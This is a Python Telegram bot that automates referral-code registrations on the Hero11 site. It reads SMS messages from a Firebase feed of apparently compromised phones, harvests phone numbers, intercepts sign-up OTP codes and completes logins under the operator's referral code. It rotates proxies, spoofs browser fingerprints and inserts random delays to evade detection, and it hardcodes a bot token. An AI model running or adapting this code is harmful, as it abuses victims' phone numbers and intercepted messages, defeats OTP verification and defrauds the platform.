import os
import sys
import asyncio
import re
import time
import uuid
import random
import json
import gc

import requests
from curl_cffi.requests import AsyncSession
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==============================================================================
# ⚙️ CONFIGURATION & SECURITY
# ==============================================================================
BOT_TOKEN = "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM"  # Apna Telegram Bot Token yahan dalein
ADMIN_ID = 8337013809  # Apna Admin User ID yahan dalein
OTP_TIMEOUT = 30
POLL_INTERVAL = 2
TIMEOUT = 30

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# In-memory storage for session configurations (Strictly 1 code max)
USER_DATA = {
    "firebase": None,
    "codes": [],  # Max length enforced to 1
    "proxies": []
}

class Form(StatesGroup):
    waiting_for_firebase = State()
    waiting_for_codes = State()
    waiting_for_proxies = State()

# ==============================================================================
# 🛒 HERO11 ASYNC CLIENT ENGINE & HELPERS
# ==============================================================================
def parse_firebase_link(link: str):
    link = link.strip()
    if not link or link.startswith("#"):
        return None
    if not link.startswith("http"):
        link = "https://" + link
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        return link if link.endswith("/") else link + "/"
    return None

def extract_phone(messages_dict):
    text_data = str(messages_dict)
    match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
    return match.group(1) if match else None

def get_random_proxy():
    if USER_DATA["proxies"]:
        return random.choice(USER_DATA["proxies"])
    return None

class AsyncHero11Client:
    BASE_URL = "https://hero11-in.hero11apex.com"
    
    def __init__(self, phone: str, invite_code: str):
        self.phone = re.sub(r'[^0-9+]', '', str(phone))
        if not self.phone.startswith('+'):
            digits = re.sub(r'[^0-9]', '', self.phone)
            if len(digits) == 10:
                self.phone = "+91" + digits
            elif len(digits) >= 10:
                self.phone = "+91" + digits[-10:]
        
        self.invite_code = invite_code
        self.device_id = uuid.uuid4().hex
        self.proxy = get_random_proxy()
        self.session = AsyncSession(proxy=self.proxy) if self.proxy else AsyncSession()
        self.access_token = None
        self.attribute_uuid = None

    async def close(self):
        try:
            await self.session.close()
        except Exception:
            pass

    async def _request(self, method, path, data=None):
        url = self.BASE_URL + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://hero11-in.hero11apex.com",
            "Referer": f"https://hero11-in.hero11apex.com/en/affiliate-invited?c={self.invite_code}&s=1",
            "X-IP-Country": "IN",
            "X-Region": "IN",
            "X-Lang": "en-US",
            "X-Site-Code": "hero11-in",
            "X-UI-Variant": "v2",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
            "Sec-Ch-Ua-Mobile": "?0",
        }
        if self.access_token:
            headers["Authorization"] = self.access_token

        try:
            response = await self.session.request(
                method, url, json=data, headers=headers, impersonate="chrome", timeout=TIMEOUT
            )
            if response.status_code >= 400:
                return None
            return response.json()
        except Exception:
            return None

    async def pre_bind(self):
        payload = {
            "inviteCode": self.invite_code,
            "device": "pc",
            "source": "1",
            "activity": "3",
            "use_type": 1,
            "materialId": 10
        }
        await asyncio.sleep(random.uniform(0.8, 1.8))
        result = await self._request("POST", "/services/user/attribution/v1/attributionLink", data=payload)
        if result and "data" in result and isinstance(result.get("data"), dict):
            self.attribute_uuid = result.get("data", {}).get("uuid") or str(uuid.uuid4())
        else:
            self.attribute_uuid = str(uuid.uuid4())
        return True

    async def black_check(self):
        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "deviceId": self.device_id,
            "loginType": 1,
            "phoneCountryCode": "+91"
        }
        await asyncio.sleep(random.uniform(0.5, 1.2))
        result = await self._request("POST", "/services/user/auth/v1/blackCheck", data=payload)
        if result and "data" in result and isinstance(result.get("data"), dict):
            if result["data"].get("isNew") == 2:
                return "SKIP_EXISTS"
        return "SUCCESS"

    async def send_otp(self):
        await self.pre_bind()
        check = await self.black_check()
        if check == "SKIP_EXISTS":
            return "SKIP_EXISTS"

        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "deviceId": self.device_id,
            "loginType": 1,
            "phoneCountryCode": "+91",
            "cfToken": ""
        }
        await asyncio.sleep(random.uniform(1.0, 2.2))
        result = await self._request("POST", "/services/user/auth/v1/sendCode", data=payload)
        
        if result and result.get("code") == 0:
            return "SUCCESS"
        elif result and result.get("code") in [100005, 102018, 102017, 40007]:
            return "SKIP_EXISTS"
        return "FAILED"

    async def verify_otp(self, otp_code):
        if not self.attribute_uuid:
            self.attribute_uuid = str(uuid.uuid4())
        
        clean_account = self.phone.replace("+91", "").lstrip("+")
        payload = {
            "account": clean_account,
            "code": str(otp_code).strip(),
            "deviceId": self.device_id,
            "deviceInfo": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
            "inviteCode": self.invite_code,
            "loginDeviceType": "1",
            "loginType": 1,
            "countryCode": "IN",
            "phoneCountryCode": "+91",
            "cfToken": "",
            "attributeUuid": self.attribute_uuid,
            "distinctId": self.device_id,
            "material_id": 10,
            "hash": "f4ea2d51d0827c5b8c180f4ad7b83ca2"
        }
        await asyncio.sleep(random.uniform(1.5, 3.0))
        result = await self._request("POST", "/services/user/auth/v1/loginWithCode", data=payload)
        
        if result and result.get("code") == 0:
            self.access_token = result.get("data", {}).get("accessToken")
            return "SUCCESS"
        return "INVALID"

# ==============================================================================
# 🤖 TELEGRAM KEYBOARDS & INTERACTIVE MENUS
# ==============================================================================
def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Add Firebase", callback_data="add_firebase"),
         InlineKeyboardButton(text="📝 Add Refer Code (Max 1)", callback_data="add_codes")],
        [InlineKeyboardButton(text="🌐 Add Proxies (HTTP)", callback_data="add_proxies"),
         InlineKeyboardButton(text="🟢 Check Online Devices", callback_data="check_devices")],
        [InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
        [InlineKeyboardButton(text="🚀 Start Automation", callback_data="start_automation")]
    ])

class LiveLogger:
    def __init__(self, message: types.Message):
        self.message = message
        self.last_update = 0
        self.last_text = ""

    async def set_text(self, text, force=False):
        if text == self.last_text:
            return
        now = time.time()
        if force or (now - self.last_update > 1.0):
            try:
                await self.message.edit_text(f"<code>{text}</code>", parse_mode="HTML", reply_markup=get_main_menu())
                self.last_update = time.time()
                self.last_text = text
            except Exception:
                pass

@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await state.clear()
    current_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "Not Set ❌"
    text = (
        "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
        f"🔗 <b>Firebase:</b> {'Configured ✅' if USER_DATA['firebase'] else 'Not Set ❌'}\n"
        f"📝 <b>Active Refer Code (Max 1):</b> <code>{current_code}</code>\n"
        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded\n\n"
        "Select an option below:"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data == "add_firebase")
async def cb_add_firebase(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.set_state(Form.waiting_for_firebase)
    await callback.message.answer("🔗 Please send your Firebase RTDB link now:")
    await callback.answer()

@dp.message(Form.waiting_for_firebase)
async def process_firebase_input(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    parsed = parse_firebase_link(message.text)
    if not parsed:
        await message.answer("❌ Invalid Firebase URL. Try again:")
        return
    USER_DATA["firebase"] = parsed
    await state.clear()
    await message.answer(f"✅ Firebase saved successfully!\n<code>{parsed}</code>", parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data == "add_codes")
async def cb_add_codes(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.set_state(Form.waiting_for_codes)
    await callback.message.answer("📝 Please send your <b>single</b> referral code (strictly max 1 allowed):")
    await callback.answer()

@dp.message(Form.waiting_for_codes)
async def process_codes_input(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    code = message.text.strip().upper()
    if not code:
        await message.answer("❌ Code cannot be empty. Try again:")
        return
    # Strictly enforce max 1 code
    USER_DATA["codes"] = [code]
    await state.clear()
    await message.answer(f"✅ Active Refer Code set to: <code>{code}</code> (Strictly 1 code max)", parse_mode="HTML", reply_markup=get_main_menu())

@dp.callback_query(F.data == "add_proxies")
async def cb_add_proxies(callback: types.CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.set_state(Form.waiting_for_proxies)
    await callback.message.answer("🌐 Please send your HTTP proxies (one per line, format: `http://ip:port` or `http://user:pass@ip:port`):")
    await callback.answer()

@dp.message(Form.waiting_for_proxies)
async def process_proxies_input(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    new_proxies = [p.strip() for p in message.text.split("\n") if p.strip() and p.startswith("http")]
    USER_DATA["proxies"].extend(new_proxies)
    await state.clear()
    await message.answer(f"✅ Added {len(new_proxies)} HTTP proxies! Total loaded: {len(USER_DATA['proxies'])}", reply_markup=get_main_menu())

@dp.callback_query(F.data == "check_devices")
async def cb_check_devices(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["firebase"]:
        await callback.answer("❌ Please add a Firebase link first!", show_alert=True)
        return

    await callback.message.answer("🔍 Scanning Firebase database for online devices...")
    try:
        online_count = 0
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{USER_DATA['firebase']}clients.json", timeout=10) as r:
                clients_data = await r.json() or {}
                for cid, cdata in clients_data.items():
                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                        online_count += 1
        await callback.message.answer(f"🟢 <b>Exact Online Devices Count:</b> {online_count}", parse_mode="HTML", reply_markup=get_main_menu())
    except Exception as e:
        await callback.message.answer(f"❌ Error checking devices: {e}", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data == "check_proxies")
async def cb_check_proxies(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["proxies"]:
        await callback.answer("❌ No proxies loaded!", show_alert=True)
        return

    status_msg = await callback.message.answer(f"⚡ Testing {len(USER_DATA['proxies'])} proxies...")
    working = 0
    import aiohttp
    async with aiohttp.ClientSession() as session:
        for p in USER_DATA["proxies"]:
            try:
                async with session.get("https://httpbin.org/ip", proxy=p, timeout=5) as r:
                    if r.status == 200:
                        working += 1
            except Exception:
                pass
    await status_msg.edit_text(f"⚡ Proxy Health Check Complete!\n🟢 Working Proxies: {working}/{len(USER_DATA['proxies'])}", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(F.data == "start_automation")
async def cb_start_automation(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    if not USER_DATA["firebase"] or not USER_DATA["codes"]:
        await callback.answer("❌ Please configure Firebase and add your 1 refer code first!", show_alert=True)
        return

    firebase_url = USER_DATA["firebase"]
    current_code = USER_DATA["codes"][0]
    total_needed = 2  # Exactly 2 refers required for the 1 code

    status_msg = await callback.message.answer(f"🚀 <b>Automation started!</b> Target Needed: exactly 2 registrations for code <code>{current_code}</code>", parse_mode="HTML")
    success_count = 0
    registered_numbers = []
    skipped_phones = set()
    used_phones = set()
    logger = LiveLogger(status_msg)

    # Strictly continue scanning until exact quota (2 registrations) is met
    while success_count < total_needed:
        import aiohttp
        online_targets = []
        total_online_count = 0
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
                    clients_data = await r.json() or {}

                for cid, cdata in clients_data.items():
                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                        total_online_count += 1
                        if cid not in skipped_phones and cid not in used_phones:
                            try:
                                async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
                                    msgs = await m_req.json()
                                    phone = extract_phone(msgs) if msgs else None
                                    if phone:
                                        full_phone = "+91" + phone
                                        if full_phone not in skipped_phones and full_phone not in used_phones:
                                            online_targets.append({"cid": cid, "phone": full_phone})
                            except Exception:
                                pass
        except Exception as e:
            await logger.set_text(f"⚠️ Firebase connection error: {e}. Retrying in 5s...")
            await asyncio.sleep(5)
            continue

        if not online_targets:
            await logger.set_text("🔴 Exhausted available online devices in Firebase. Waiting for new devices...")
            await asyncio.sleep(5)
            continue

        target = online_targets[0]
        cid = target["cid"]
        phone = target["phone"]
        used_phones.add(phone)

        await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")

        async with aiohttp.ClientSession() as session:
            known_keys = set()
            try:
                async with session.get(f'{firebase_url}messages/{cid}.json?shallow=true', timeout=5) as r:
                    k_data = await r.json()
                    if isinstance(k_data, dict):
                        known_keys = set(k_data.keys())
            except Exception:
                pass

        client = AsyncHero11Client(phone, current_code)
        send_status = await client.send_otp()

        if send_status != "SUCCESS":
            skipped_phones.add(phone)
            await client.close()
            continue

        await logger.set_text(f"🎯 Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (30s timeout)...")

        otp_found = None
        start_poll = time.time()
        while time.time() - start_poll < OTP_TIMEOUT:
            await asyncio.sleep(POLL_INTERVAL)
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as r:
                        msgs = await r.json()
                        if isinstance(msgs, dict):
                            for msg_key, msg_val in msgs.items():
                                if msg_key not in known_keys and isinstance(msg_val, dict):
                                    txt = str(msg_val.get("body") or msg_val.get("message") or "")
                                    for otp in re.findall(r'\b(\d{6})\b', txt):
                                        if otp not in ["000000", "123456", "111111", "999999"]:
                                            otp_found = otp
                                            break
                            if otp_found:
                                break
            except Exception:
                pass

        if not otp_found:
            skipped_phones.add(phone)
            await client.close()
            continue

        await logger.set_text(f"🎯 Phone: {phone} | OTP Found: {otp_found}\nVerifying login...")
        v_res = await client.verify_otp(otp_found)

        if v_res == "SUCCESS":
            success_count += 1
            skipped_phones.add(phone)
            registered_numbers.append(phone)
            await logger.set_text(f"✅ SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
        else:
            skipped_phones.add(phone)

        await client.close()
        await asyncio.sleep(1.5)

    # Format the exact registered numbers list output
    numbers_list_str = "\n".join([f"• <code>{num}</code>" for num in registered_numbers])
    final_msg = (
        f"🎉 <b>REGISTRATION PROCESS COMPLETED!</b> 🎉\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 <b>Online Devices Detected:</b> {total_online_count}\n"
        f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
        f"📱 <b>Exact Registered Numbers:</b>\n{numbers_list_str}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await callback.message.answer(final_msg, parse_mode="HTML", reply_markup=get_main_menu())
    await callback.answer()

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n❌ Bot stopped.")
        sys.exit(0)
